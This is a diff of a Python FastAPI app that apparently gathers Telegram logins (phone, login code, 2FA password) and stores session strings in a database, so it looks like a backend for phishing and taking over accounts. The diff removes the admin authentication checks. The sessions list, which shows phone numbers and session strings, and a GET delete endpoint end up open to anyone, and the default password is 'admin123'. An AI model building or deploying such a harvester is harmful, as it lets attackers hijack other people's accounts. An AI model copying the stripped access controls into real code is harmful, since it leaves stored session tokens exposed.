@@ -1,3 +1,4 @@
+# app.py
 import os
 import sqlite3
 from fastapi import FastAPI, Request, Form, HTTPException
@@ -12,10 +13,9 @@ templates = Jinja2Templates(directory=".")
 
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
-ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
+ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
 DB = "sessions.db"
 
-# In-memory clients
 CLIENTS = {}
 
 # === DATABASE ===
@@ -24,7 +24,6 @@ def init_db():
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.close()
 
-# CLEAR OLD SESSION ON START (for testing)
 if os.getenv("CLEAR_DB") == "1":
     if os.path.exists(DB):
         os.remove(DB)
@@ -59,7 +58,6 @@ async def home(request: Request):
     if not phone:
         raise HTTPException(400, "Phone required")
     
-    # Auto-clear old session
     if phone in CLIENTS:
         del CLIENTS[phone]
     delete_session(phone)
@@ -104,7 +102,7 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
     except Exception as e:
         return JSONResponse({"error": str(e)})
 
-# === ADMIN PANEL (PASSWORD PROTECTED) ===
+# === ADMIN PANEL ===
 @app.get("/admin")
 async def admin_login():
     return HTMLResponse("""
@@ -123,9 +121,6 @@ async def admin_check(password: str = Form(...)):
 
 @app.get("/admin/sessions", response_class=HTMLResponse)
 async def admin_sessions():
-    if not await check_admin():
-        return RedirectResponse("/admin")
-    
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
@@ -142,16 +137,12 @@ async def admin_sessions():
             <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;'>Delete</a>
         </li>
         """
-    html += "</ol><a href='/admin'>← Back</a>"
+    html += "</ol><a href='/admin'>Back</a>"
     return HTMLResponse(html)
 
 @app.get("/admin/delete")
 async def delete(phone: str):
-    if not await check_admin():
-        raise HTTPException(403)
     delete_session(phone)
     return RedirectResponse("/admin/sessions")
 
-async def check_admin():
-    # In real app: use session/cookie
-    return True  # Simplified
+# === NO check_admin() needed — simplified ===
